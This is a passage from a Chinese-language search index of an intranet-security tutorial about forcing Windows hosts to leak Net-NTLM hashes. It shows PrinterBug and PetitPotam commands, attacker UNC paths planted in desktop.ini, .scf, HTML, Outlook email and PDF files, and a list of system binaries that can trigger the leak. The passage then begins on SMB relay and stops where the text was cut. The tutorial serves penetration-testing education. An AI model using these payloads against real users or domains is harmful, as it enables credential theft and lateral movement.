<p>\u5982\u56fe\u6240\u793a\uff0c\u5728\u5c40\u57df\u7f51\u5185\u4efb\u4e00\u4e3b\u673a 10.211.55.7 \u4e0a\u8bf7\u6c42\u89e3\u6790\u4e0d\u5b58\u5728\u7684\u540d\u79f0\u201cabcdefgh\u201d\uff1a</p> <p></p> <p>\u6b64\u65f6\u6211\u4eec\u7684 Responder \u5c31\u53ef\u4ee5\u5bf9\u76ee\u6807\u4e3b\u673a\u8fdb\u884c LLMNR/NBNS \u6bd2\u5316\uff0c\u5e76\u8bf7\u6c42\u5176\u8f93\u5165\u51ed\u636e\u8ba4\u8bc1\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u6293\u5230\u76ee\u6807\u4e3b\u673a\u7684 Net-NTLM Hash \u4e86\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2","title":"2.\u6253\u5370\u673a\u6f0f\u6d1e","text":"<p>Windows \u7684 <code>MS-RPRN</code> \u534f\u8bae\u7528\u4e8e\u6253\u5370\u5ba2\u6237\u673a\u548c\u6253\u5370\u670d\u52a1\u5668\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f\u542f\u7528\u7684\u3002\u534f\u8bae\u5b9a\u4e49\u7684 <code>RpcRemoteFindFirstPrinterChangeNotificationEx()</code>\u8c03\u7528\u521b\u5efa\u4e00\u4e2a\u8fdc\u7a0b\u66f4\u6539\u901a\u77e5\u5bf9\u8c61\uff0c\u8be5\u5bf9\u8c61\u76d1\u89c6\u5bf9\u6253\u5370\u673a\u5bf9\u8c61\u7684\u66f4\u6539\uff0c\u5e76\u5c06\u66f4\u6539\u901a\u77e5\u53d1\u9001\u5230\u6253\u5370\u5ba2\u6237\u7aef\u3002\u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u57df\u6210\u5458\u90fd\u53ef\u4ee5\u8fde\u63a5\u5230\u8fdc\u7a0b\u670d\u52a1\u5668\u7684\u6253\u5370\u670d\u52a1\uff08spoolsv.exe\uff09\uff0c\u5e76\u8bf7\u6c42\u5bf9\u4e00\u4e2a\u65b0\u7684\u6253\u5370\u4f5c\u4e1a\u8fdb\u884c\u66f4\u65b0\uff0c\u4ee4\u5176\u5c06\u8be5\u901a\u77e5\u53d1\u9001\u7ed9\u6307\u5b9a\u76ee\u6807\u3002\u4e4b\u540e\u5b83\u4f1a\u5c06\u7acb\u5373\u6d4b\u8bd5\u8be5\u8fde\u63a5\uff0c\u5373\u5411\u6307\u5b9a\u76ee\u6807\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff08\u653b\u51fb\u8005\u53ef\u4ee5\u9009\u62e9\u901a\u8fc7 Kerberos \u6216 NTLM \u8fdb\u884c\u9a8c\u8bc1\uff09\u3002\u5fae\u8f6f\u8868\u793a\u8fd9\u4e2a bug \u662f\u7cfb\u7edf\u8bbe\u8ba1\u7279\u70b9\uff0c\u65e0\u9700\u4fee\u590d\u3002\u7531\u4e8e\u6253\u5370\u673a\u662f\u4ee5 system \u6743\u9650\u8fd0\u884c\u7684\uff0c\u6240\u4ee5\u6211\u4eec\u8bbf\u95ee\u6253\u5370\u673a RPC\uff0c\u8feb\u4f7f\u6253\u5370\u673a\u670d\u52a1\u5411\u6211\u4eec\u53d1\u8d77\u8bf7\u6c42\uff0c\u6211\u4eec\u5c31\u80fd\u62ff\u5230\u76ee\u6807\u673a\u5668\u7528\u6237\u7684 <code>Net-NTLM Hash</code>\u3002</p> <p>\u6211\u4eec\u4f7f\u7528 printerbug.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u4f7f\u7528\u57df\u5185\u4efb\u610f\u7528\u6237\u8bbf\u95ee\u76ee\u6807\u673a\u5668\u7684\u6253\u5370\u673a\u670d\u52a1\uff0c\u6b64\u811a\u672c\u4f1a\u89e6\u53d1 SpoolService Bug\uff0c\u5f3a\u5236 Windows \u4e3b\u673a AD01 \u4e5f\u5c31\u662f10.211.55.4 \u901a\u8fc7 MS-RPRNRPC \u63a5\u53e3\u5411\u653b\u51fb\u8005 10.211.55.2 \u8fdb\u884c NTLM \u8eab\u4efd\u8ba4\u8bc1\u3002</p> <pre><code>python3 printerbug.py xie/hack:P@ss1234@10.211.55.4 10.211.55.2\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 printerbug.py \u811a\u672c\u89e6\u53d1\u76ee\u6807\u670d\u52a1\u5668\u5411\u653b\u51fb\u8005\u53d1\u8d77 SMB \u8ba4\u8bc1\u3002</p> <p></p> <p>\u6b64\u65f6\u6211\u4eec\u7684 Responder \u5df2\u7ecf\u6536\u5230\u76ee\u6807\u673a\u5668\u5411\u6211\u4eec\u53d1\u9001\u7684 SMB \u7c7b\u578b\u7684 Net- NTLMHash \u4e86\uff0c\u5982\u56fe\u6240\u793a\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#3petitpotam","title":"3.PetitPotam","text":"<p>2021 \u5e74 7 \u6708 19 \u65e5\uff0c\u6cd5\u56fd\u5b89\u5168\u7814\u7a76\u4eba\u5458 Gilles Lionel \u62ab\u9732\u4e86\u4e00\u79cd\u65b0\u578b\u7684\u89e6\u53d1Net-NTLMHash \u7684\u5229\u7528\u624b\u6cd5\u2014\u2014PetitPotam\u3002\u8be5\u6f0f\u6d1e\u5229\u7528\u4e86<code>\u5fae\u8f6f\u52a0\u5bc6\u6587\u4ef6\u7cfb\u7edf\u8fdc\u7a0b\u534f\u8bae\uff08MS-EFSRPC\uff0cMicroSoft Encrypting File System Remote Protocol\uff09</code>\u3002MS-EFSRPC \u662f Microsoft \u7684\u52a0\u5bc6\u6587\u4ef6\u7cfb\u7edf\u8fdc\u7a0b\u534f\u8bae\uff0c\u7528\u4e8e\u5bf9\u8fdc\u7a0b\u5b58\u50a8\u548c\u901a\u8fc7\u7f51\u7edc\u8bbf\u95ee\u7684\u52a0\u5bc6\u6570\u636e\u6267\u884c\u201c\u7ef4\u62a4\u548c\u7ba1\u7406\u64cd\u4f5c\u201d\u3002\u5229\u7528 PetitPotam\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8fde\u63a5\u5230 LSARPC \u5f3a\u5236\u89e6\u53d1\u76ee\u6807\u673a\u5668\u5411\u6307\u5b9a\u8fdc\u7a0b\u670d\u52a1\u5668\u53d1\u9001 Net-NTLMHash\u3002</p> <p>\u6211\u4eec\u4f7f\u7528 Petitpotam.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\uff0c\u5f3a\u5236\u76ee\u6807\u4e3b\u673a AD01 \u4e5f\u5c31\u662f10.211.55.4 \u673a\u5668\u5411\u653b\u51fb\u8005 10.211.55.2 \u53d1\u8d77 NTLM \u8ba4\u8bc1\u3002</p> <pre><code>python3 Petitpotam.py -d xie.com -u hack -p P@ss1234 10.211.55.2 10.211.55.4\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 Petitpotam.py \u811a\u672c\u89e6\u53d1\u76ee\u6807\u670d\u52a1\u5668\u5411\u653b\u51fb\u8005\u53d1\u8d77 SMB \u8ba4\u8bc1\u3002</p> <p></p> <p>\u6b64\u65f6\u6211\u4eec\u7684 Responder \u5df2\u7ecf\u6536\u5230\u76ee\u6807\u673a\u5668\u5411\u6211\u4eec\u53d1\u9001\u7684 SMB \u7c7b\u578b\u7684 Net- NTLMHash \u4e86</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#4","title":"4.\u56fe\u6807","text":"<p>\u5f53\u56fe\u6807\u7684\u4e00\u4e9b\u8def\u5f84\u5c5e\u6027\u6539\u6210\u6211\u4eec\u7684 UNC \u8def\u5f84\u7684\u8bdd\uff0c\u6211\u4eec\u5c31\u80fd\u6536\u5230\u76ee\u6807\u670d\u52a1\u5668\u53d1\u6765\u7684 NTLM \u8bf7\u6c42\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1desktopini","title":"\uff081\uff09desktop.ini","text":"<p>\u5728\u6bcf\u4e2a\u6587\u4ef6\u5939\u5e95\u4e0b\u90fd\u6709\u4e00\u4e2a\u9690\u85cf\u6587\u4ef6 desktop.ini\uff0c\u5176\u4f5c\u7528\u662f\u6307\u5b9a\u6587\u4ef6\u5939\u7684\u56fe\u6807\u4e4b\u7c7b\u3002\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u6587\u4ef6\u5939\u5c5e\u6027\u2014\u2014&gt;\u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6(\u63a8\u8350) \uff0c\u6765\u663e\u793adesktop.ini \u6587\u4ef6\u3002</p> <p>\u9996\u5148\u521b\u5efa\u4e00\u4e2a test \u6587\u4ef6\u5939\uff0c\u7136\u540e\u4fee\u6539\u8be5\u6587\u4ef6\u5939\u7684\u56fe\u6807\u4e3a\u4efb\u4f55\u5176\u4ed6\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u7136\u540e\u53d6\u6d88\u52fe\u9009\u8be5\u6587\u4ef6\u5939\u7684 \u9690\u85cf\u53d7\u4fdd\u62a4\u7684\u64cd\u4f5c\u7cfb\u7edf\u6587\u4ef6(\u63a8\u8350) \u5c5e\u6027\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u63a5\u7740\u5c31\u80fd\u5728 test \u6587\u4ef6\u5939\u4e0b\u770b\u5230 desktop.ini \u6587\u4ef6\u4e86\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u5c06 IconResource \u66ff\u6362\u4e3a\u653b\u51fb\u8005\u7684 UNC \u8def\u5f84\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u53ea\u8981\u6709\u4eba\u8bbf\u95ee\u4e86 test \u6587\u4ef6\u5939\uff0c\u76ee\u6807\u4e3b\u673a\u5c31\u4f1a\u53bb\u8bf7\u6c42\u6307\u5b9a UNC \u7684\u56fe\u6807\u8d44\u6e90\uff0c\u4e8e\u662f\u8be5\u4e3b\u673a\u4f1a\u5c06\u5f53\u524d\u7528\u6237\u7684 Net-NTLM Hash \u53d1\u9001\u7ed9\u6307\u5b9a\u7684\u673a\u5668\uff0c\u6211\u4eec\u5728\u6307\u5b9a UNC \u7684\u673a\u5668\u4e0a\u4f7f\u7528 Responder \u76d1\u542c\uff0c\u5c31\u80fd\u63a5\u6536\u5230\u76ee\u6807\u673a\u5668\u53d1\u6765\u7684 Net-NTLM Hash \u4e86\u3002</p> <p>\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#2scf","title":"\uff082\uff09scf \u6587\u4ef6","text":"<p>\u53ea\u8981\u4e00\u4e2a\u6587\u4ef6\u5939\u5185\u542b\u6709 scf \u540e\u7f00\u7684\u6587\u4ef6\uff0c\u7531\u4e8e scf \u6587\u4ef6\u5305\u542b\u4e86 IconFile \u5c5e\u6027\uff0c\u6240\u4ee5 explore.exe \u4f1a\u5c1d\u8bd5\u83b7\u53d6\u6587\u4ef6\u5939\u7684\u56fe\u6807\u3002\u800c IconFile \u662f\u652f\u6301 UNC \u8def\u5f84\u7684\uff0c\u6240\u4ee5\u5f53\u6253\u5f00\u6587\u4ef6\u5939\u7684\u65f6\u5019\uff0c\u76ee\u6807\u4e3b\u673a\u5c31\u4f1a\u53bb\u8bf7\u6c42\u6307\u5b9a UNC \u7684\u56fe\u6807\u8d44\u6e90\uff0c\u4e8e\u662f\u8be5\u4e3b\u673a\u4f1a\u5c06\u5f53\u524d\u7528\u6237\u7684 NTLM v2 hash \u53d1\u9001\u7ed9\u6307\u5b9a\u7684\u673a\u5668\uff0c\u6211\u4eec\u5728\u8be5\u673a\u5668\u4e0a\u4f7f\u7528Responder \u76d1\u542c\uff0c\u5c31\u80fd\u63a5\u6536\u5230\u76ee\u6807\u673a\u5668\u53d1\u6765\u7684 Net-NTLM Hash \u4e86\u3002</p> <p>\u4ee5\u4e0b\u662f scf \u540e\u7f00\u7684\u6587\u4ef6\u7684\u683c\u5f0f\uff1a</p> <pre><code>v[Shell]\nCommand=2\nIconFile=UNC \u8def\u5f84\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <p>\u521b\u5efa\u4e00\u4e2a test \u6587\u4ef6\u5939\uff0c\u5728\u8be5\u6587\u4ef6\u5939\u5185\u521b\u5efa test.scf \u6587\u4ef6\uff0c\u6587\u4ef6\u5185\u5bb9\u5982\u4e0b\uff1a</p> <pre><code>[Shell]\nCommand=2\nIconFile=\\\\10.211.55.2\\test\\test.ico\n[Taskbar]\nCommand=ToggleDesktop\n</code></pre> <p>\u53ea\u8981\u6709\u4eba\u8bbf\u95ee\u4e86 test \u6587\u4ef6\u5939\uff0c\u76ee\u6807\u4e3b\u673a\u5c31\u4f1a\u53bb\u8bf7\u6c42\u6307\u5b9a UNC \u7684\u56fe\u6807\u8d44\u6e90\uff0c\u4e8e\u662f\u8be5\u4e3b\u673a\u4f1a\u5c06\u5f53\u524d\u7528\u6237\u7684 NTLM v2 hash \u53d1\u9001\u7ed9\u6307\u5b9a\u7684\u673a\u5668\uff0c\u6211\u4eec\u5728\u6307\u5b9a\u7684 UNC \u5730\u5740\u7684\u673a\u5668\u4e0a\u4f7f\u7528 Responder \u76d1\u542c\uff0c\u5c31\u80fd\u63a5\u6536\u5230\u76ee\u6807\u673a\u5668\u53d1\u6765\u7684 Net-NTLM Hash\u4e86\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#5","title":"5.\u6d4f\u89c8\u5668","text":"<p>\u5f53\u6d4f\u89c8\u5668\u8bbf\u95ee\u7684\u9875\u9762\u4e2d\u542b\u6709 UNC \u8def\u5f84\u7684\u8bdd\uff0c\u6d4f\u89c8\u5668\u5728\u89e3\u6790\u8be5\u9875\u9762\u65f6\u4e5f\u4f1a\u5c1d\u8bd5\u8bf7\u6c42\u8be5 UNC \u5730\u5740\uff0c\u7136\u540e\u53d1\u8d77 NTLM \u8ba4\u8bc1\u3002</p> <p>\u4e0d\u540c\u6d4f\u89c8\u5668\u5bf9\u4e8e\u63d2\u5165\u7684\u4e0d\u540c\u683c\u5f0f\u7684 UNC \u8def\u5f84\u6709\u4e0d\u540c\u7684\u7ed3\u679c\u3002</p> <p>\u5982\u4e0b\u662f\u7f51\u9875\u6587\u4ef6\uff0c\u63d2\u5165\u7684 UNC \u683c\u5f0f\u4e3a\\10.211.55.15\\test\u3002</p> <pre><code>&lt;!doctype html&gt;\n&lt;html lang=\"en\"&gt;\n&lt;head&gt;\n&lt;meta charset=\"UTF-8\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n&lt;/body&gt;\n&lt;script src=\"\\\\10.211.55.2\\test\"&gt;&lt;/script&gt;\n&lt;/html&gt;\n</code></pre> <p>\u8fd9\u65f6\u7528\u6237\u4f7f\u7528 IE \u6d4f\u89c8\u5668\u8bbf\u95ee\u8be5\u9875\u9762\uff0c\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6211\u4eec\u5c31\u80fd\u83b7\u53d6\u5230\u76ee\u6807\u7528\u6237 SMB \u7c7b\u578b\u7684 Net-NTLM Hash \u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#6outlook","title":"6.Outlook","text":"<p>Outlook \u90ae\u4ef6\u652f\u6301\u53d1\u9001 HTML \u683c\u5f0f\u7684\u90ae\u4ef6\uff0c\u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u53d1\u9001\u5e26\u6709\u5982\u4e0b html payload \u7684\u90ae\u4ef6\u7ed9\u6307\u5b9a\u7528\u6237\u3002</p> <pre><code>&lt;p&gt;\u90ae\u4ef6\u53d1\u9001\u6d4b\u8bd5...&lt;/p&gt;\n&lt;img src=\"\\\\\\\\10.211.55.2\\\\test\"&gt;\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u76ee\u6807\u7528\u6237 administrator \u6536\u5230\u4e86\u6076\u610f\u7684\u90ae\u4ef6\u3002</p> <p></p> <p>\u5f53\u76ee\u6807\u4f7f\u7528\u7684\u662f Windows \u673a\u5668\uff0c\u5e76\u4e14\u4f7f\u7528\u7684\u662f Outlook \u5ba2\u6237\u7aef\u7684\u8bdd\uff0c\u4ed6\u751a\u81f3\u4e0d\u9700\u8981\u6253\u5f00\u548c\u70b9\u51fb\u90ae\u4ef6\uff0cOutlook \u5ba2\u6237\u7aef\u5c31\u4f1a\u81ea\u52a8\u5411\u6307\u5b9a UNC \u8def\u5f84\u8fdb\u884c\u8ba4\u8bc1\uff0c\u6211\u4eec\u5c31\u80fd\u6536\u5230\u76ee\u6807\u7528\u6237\u7684 Net-NTLM Hash \u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#7","title":"7.\u7cfb\u7edf\u547d\u4ee4","text":"<p>\u901a\u8fc7\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\uff0c\u8bbf\u95ee\u6307\u5b9a\u7684 UNC \u8def\u5f84\uff0c\u4e5f\u53ef\u4ee5\u83b7\u53d6\u76ee\u6807\u673a\u5668\u7684 Net-NTLM Hash\u3002</p> <pre><code>net.exe use \\hostshare\nattrib.exe \\hostshare\ncacls.exe \\hostshare\ncertreq.exe \\hostshare #(noisy, pops an error dialog)\ncertutil.exe \\hostshare\ncipher.exe \\hostshare\nClipUp.exe -l \\hostshare\ncmdl32.exe \\hostshare\ncmstp.exe /s \\hostshare\ncolorcpl.exe \\hostshare #(noisy, pops an error dialog)\ncomp.exe /N=0 \\hostshare \\hostshare\ncompact.exe \\hostshare\ncontrol.exe \\hostshare\nconvertvhd.exe -source \\hostshare -destination \\hostshare\nDefrag.exe \\hostshare\ndiskperf.exe \\hostshare\ndispdiag.exe -out \\hostshare\ndoskey.exe /MACROFILE=\\hostshare\nesentutl.exe /k \\hostshare\nexpand.exe \\hostshare\nextrac32.exe \\hostshare\nFileHistory.exe \\hostshare #(noisy, pops a gui)\nfindstr.exe * \\hostshare\nfontview.exe \\hostshare #(noisy, pops an error dialog)\nfvenotify.exe \\hostshare #(noisy, pops an access denied error)\nFXSCOVER.exe \\hostshare #(noisy, pops GUI)\nhwrcomp.exe -check \\hostshare\nhwrreg.exe \\hostshare\nicacls.exe \\hostshare\nlicensingdiag.exe -cab \\hostshare\nlodctr.exe \\hostshare\nlpksetup.exe /p \\hostshare /s\nmakecab.exe \\hostshare\nmsiexec.exe /update \\hostshare /quiet\nmsinfo32.exe \\hostshare #(noisy, pops a \"cannot open\" dialog)\nmspaint.exe \\hostshare #(noisy, invalid path to png error)\nmsra.exe /openfile \\hostshare #(noisy, error)\nmstsc.exe \\hostshare #(noisy, error)\nnetcfg.exe -l \\hostshare -c p -i foo\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528\u7cfb\u7edf\u547d\u4ee4 cacls.exe \u89e6\u53d1 Net-NTLM Hash\u3002</p> <p></p> <p>\u5982\u56fe\u6240\u793a\uff0c\u53ef\u4ee5\u770b\u5230\u6536\u5230\u76ee\u6807\u673a\u5668\u7684 Net-NTLM Hash \u4e86\u3002</p> <p></p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#8-pdf","title":"8. pdf","text":"<p>PDF \u6587\u4ef6\u53ef\u4ee5\u6dfb\u52a0\u8bf7\u6c42\u8fdc\u7a0b SMB \u670d\u52a1\u5668\u6587\u4ef6\u7684\u529f\u80fd\u3002\u4e8e\u662f\u53ef\u4ee5\u5229\u7528 PDF \u6587\u4ef6\u7684\u6b63\u5e38\u529f\u80fd\u591f\u7a83\u53d6 Windows \u7cfb\u7edf\u7684 Net-NTLM Hash\u3002\u5f53\u7528\u6237\u4f7f\u7528 PDF \u9605\u8bfb\u5668\u6253\u5f00\u4e00\u4efd\u6076\u610f\u7684 PDF \u6587\u6863\uff0c\u8be5 PDF \u4f1a\u5411\u8fdc\u7a0b SMB \u670d\u52a1\u5668\u53d1\u51fa\u8bf7\u6c42\uff0c\u5982\u679c\u8be5\u8fdc\u7a0bSMB \u670d\u52a1\u5668\u5bf9\u6570\u636e\u5305\u8fdb\u884c\u6293\u53d6\uff0c\u5c31\u80fd\u591f\u83b7\u5f97\u76ee\u6807\u7528\u6237\u7684 Net-NTLM Hash\u3002</p> <p>\u4f7f\u7528 WorsePDF.py \u811a\u672c\u6267\u884c\u5982\u4e0b\u547d\u4ee4\u5f80\u6b63\u5e38\u7684 PDF \u6587\u4ef6\u4e2d\u52a0\u5165\u8bf7\u6c42\u8fdc\u7a0b SMB\u670d\u52a1\u5668\u7684\u529f\u80fd\uff0c\u751f\u6210<code>test.pdf.malicious.pdf</code>\u6587\u4ef6\u3002</p> <pre><code>python2 WorsePDF.py test.pdf 10.211.55.2\n</code></pre> <p>\u5982\u56fe\u6240\u793a\uff0c\u4f7f\u7528 WorsePDF.py \u811a\u672c\u5f80\u6b63\u5e38\u7684 pdf \u6587\u4ef6\u4e2d\u52a0\u5165\u8bf7\u6c42\u6307\u5b9a\u8fdc\u7a0b SMB\u670d\u52a1\u5668\u7684\u529f\u80fd\uff0c\u751f\u6210 <code>test.pdf.malicious.pdf</code> \u6587\u4ef6\u3002</p> <p></p> <p>\u7136\u540e\u76ee\u6807\u4e3b\u673a\u4f7f\u7528 Adobe PDF \u9605\u8bfb\u5668\u6253\u5f00\u8be5<code>test.pdf.malicious.pdf</code>\u6587\u4ef6\uff0c\u6211\u4eec\u5373\u53ef\u6536\u5230\u76ee\u6807\u7528\u6237\u7684 Net-NTLM Hash \u4e86\u3002\u5982\u56fe\u6240\u793a\uff1a</p> <p></p> <p>\u6ce8\uff1a\u7ecf\u8fc7\u6d4b\u8bd5\u53d1\u73b0\uff0c\u53ea\u6709\u4f7f\u7528 Adobe PDF \u9605\u8bfb\u5668\u624d\u4f1a\u6536\u5230\u76ee\u6807\u4e3b\u673a\u7684 Net- NTLM Hash\uff0cChrome\u3001Edge \u548c WPS \u7684 PDF \u9605\u8bfb\u5668\u4e0d\u80fd\u6536\u5230 Net-NTLMHash\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#net-ntlm-hash_1","title":"\u91cd\u653e Net-NTLM Hash","text":"<p>\u5728\u83b7\u53d6\u5230\u4e86\u76ee\u6807\u673a\u5668\u7684 Net-NTLM Hash \u540e\uff0c\u6211\u4eec\u8981\u600e\u4e48\u5229\u7528\u5462\uff1f\u8fd9\u91cc\u6709\u4e24\u79cd\u5229\u7528\u65b9\u5f0f\uff1a</p> <ol> <li>\u4f7f\u7528 Hashcat \u7834\u89e3 Net-NTLM Hash</li> <li>Relay Net-NTLM Hash</li> </ol> <p>\u672c\u6587\u4e3b\u8981\u8bb2\u5982\u4f55 Relay Net-NTLM Hash\u3002\u6211\u4eec\u77e5\u9053\uff0c\u7531\u4e8e NTLM \u53ea\u662f\u5e95\u5c42\u7684\u8ba4\u8bc1\u534f\u8bae\uff0c\u5fc5\u987b\u9576\u5d4c\u5728\u4e0a\u5c42\u5e94\u7528\u534f\u8bae\u91cc\u9762\uff0c\u6d88\u606f\u7684\u4f20\u8f93\u4f9d\u8d56\u4e8e\u4f7f\u7528 NTLM \u7684\u4e0a\u5c42\u534f\u8bae\uff0c\u6bd4\u5982 SMB\u3001HTTP\u3001LDAP \u7b49\u3002\u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u83b7\u53d6\u5230\u7684 Net-NTLM HashRelay \u5230\u5176\u4ed6\u4f7f\u7528 NTLM \u8fdb\u884c\u8ba4\u8bc1\u7684\u5e94\u7528\u4e0a\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1relay-to-smb","title":"1.Relay To SMB","text":"<p>\u76f4\u63a5 Relay \u5230 SMB \u670d\u52a1\uff0c\u662f\u6700\u76f4\u63a5\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u53ef\u4ee5\u76f4\u63a5\u63a7\u5236\u8be5\u670d\u52a1\u5668\u6267\u884c\u4efb\u610f\u547d\u4ee4\u7b49\u64cd\u4f5c\u3002\u8fd9\u91cc\u6839\u636e\u5de5\u4f5c\u7ec4\u548c\u57df\u73af\u5883\uff0c\u6709\u4e24\u79cd\u573a\u666f\uff0c\u5982\u4e0b\uff1a</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1","title":"\uff081\uff09\u5de5\u4f5c\u7ec4","text":"<p>\u5728\u5de5\u4f5c\u7ec4\u73af\u5883\u4e2d\uff0c\u5de5\u4f5c\u7ec4\u4e2d\u7684\u673a\u5668\u4e4b\u95f4\u76f8\u4e92\u6ca1\u6709\u4fe1\u4efb\u5173\u7cfb\uff0c\u9664\u975e\u4e24\u53f0\u673a\u5668\u7684\u8d26\u53f7\u5bc6\u7801\u76f8\u540c\uff0c\u5426\u5219 Relay \u4e0d\u6210\u529f\u3002\u4f46\u662f\u5982\u679c\u8d26\u53f7\u5bc6\u7801\u76f8\u540c\u7684\u8bdd\uff0c\u4e3a\u4f55\u4e0d\u76f4\u63a5 Pass The Hash \u54c8\u5e0c\u4f20\u9012\u653b\u51fb\u5462\uff1f\u56e0\u6b64\u5728\u5de5\u4f5c\u7ec4\u73af\u5883\u4e0b\uff0cRelay \u5230\u5176\u4ed6\u673a\u5668\u4e0d\u592a\u73b0\u5b9e\u3002\u90a3\u4e48\uff0c\u6211\u4eec\u53ef\u4ee5 Relay \u5230\u673a\u5668\u81ea\u8eab\u5417\uff1f\u7b54\u6848\u662f\u53ef\u4ee5\u7684\u3002\u4f46\u662f\u540e\u6765\u5fae\u8f6f\u5728 MS08-068 \u8865\u4e01\u4e2d\u5bf9 Relay \u5230\u81ea\u8eab\u673a\u5668\u505a\u4e86\u9650\u5236\uff0c\u4e25\u7981 Relay \u5230\u673a\u5668\u81ea\u8eab\u3002\u9053\u9ad8\u4e00\u5c3a\u9b54\u9ad8\u4e00\u4e08\uff0c\u8fd9\u4e2a\u8865\u4e01\u5728 CVE-2019-1384(Ghost Potato)\u88ab\u653b\u51fb\u8005\u7ed5\u8fc7\u4e86\u3002</p>"},{"location":"CTF/Intranet_security/Domain_AD/Penetration_techniques_within_the_domain/article6/index.html#1ms08-068-relay-to-self","title":"1\uff09MS08-068-Relay To Self","text":"<p>\u5f53\u62ff\u5230\u7528\u6237\u7684 SMB \u8bf7\u6c42\u4e4b\u540e\uff0c\u6700\u76f4\u63a5\u7684\u5c31\u662f\u628a\u8bf7\u6c42 Relay \u56de\u672c\u8eab\uff0c\u5373 Reflect\uff0c\u4ece\u800c\u63a7\u5236\u673a\u5b50\u672c\u8eab\u3002\u6f0f\u6d1e\u5371\u5bb3\u7279\u522b\u9ad8\uff0c\u8be5\u6f0f\u6d1e\u7f16\u53f7\u4e3a MS08-068\u3002\u5fae\u8f6f\u5728KB957097 \u8865\u4e01\u91cc\u9762\u901a\u8fc7\u4fee\u6539 SMB \u8eab\u4efd\u9a8c\u8bc1\u7b54\u590d\u7684\u9a8c\u8bc1\u65b9\u5f0f\u6765\u9632\u6b62\u51ed\u636e\u91cd\u64ad\uff0c\u4ece\u800c\u89e3\u51b3\u4e86\u8be5\u6f0f\u6d1e\u3002\u9632\u6b62\u51ed\u636e\u91cd\u64ad\u7684\u505a\u6cd5\u5982\u4e0b:</p> <ul> <li>\u5728 Type 1 \u9636\u6bb5\uff0c\u4e3b\u673a A \u8bbf\u95ee\u4e3b\u673a B \u8fdb\u884c SMB \u8ba4\u8bc1\u7684\u65f6\u5019\uff0c\u5c06pszTargetName \u8bbe\u7f6e\u4e3a CIFS/B</li> <li>\u5728 Type 2 \u9636\u6bb5\uff0c\u4e3b\u673a A \u62ff\u5230\u4e3b\u673a B \u53d1\u9001\u7684 Challenge \u6311\u6218\u503c\u4e4b\u540e\uff0c\u5728lsass \u8fdb\u7a0b\u91cc\u9762\u7f13\u5b58(Challenge,CIFS/B) </li> <li>\u5728 Type 3 \u9636\u6bb5\uff0c\u4e3b\u673a B \u5728\u62ff\u5230\u4e3b\u673a A \u7684\u8ba4\u8bc1\u6d88\u606f\u4e4b\u540e\uff0c\u4f1a\u53bb\u67e5\u8be2 lsass \u8fdb\u7a0b\u91cc\u9762\u6709\u6ca1\u6709\u7f13\u5b58(Challenge,CIFS/B)\uff0c\u5982\u679c\u5b58\u5728\u7f13\u5b58\uff0c\u90a3\u4e48\u8ba4\u8bc1\u5931\u8d25\u3002</li> </ul> <p>\u56e0\u4e3a\u5982\u679c\u4e3b\u673a A \u548c\u4e3b\u673a B \u662f\u4e0d\u540c\u4e3b\u673a\u7684\u8bdd\uff0c\u90a3\u4e48 lsass \u8fdb\u7a0b\u91cc\u9762\u5c31\u4e0d\u4f1a\u7f13\u5b58(Challenge,CIFS/B)\u3002\u5982\u679c\u662f\u540c\u4e00\u53f0\u4e3b\u673a\u7684\u8bdd\uff0c\u90a3 lsass 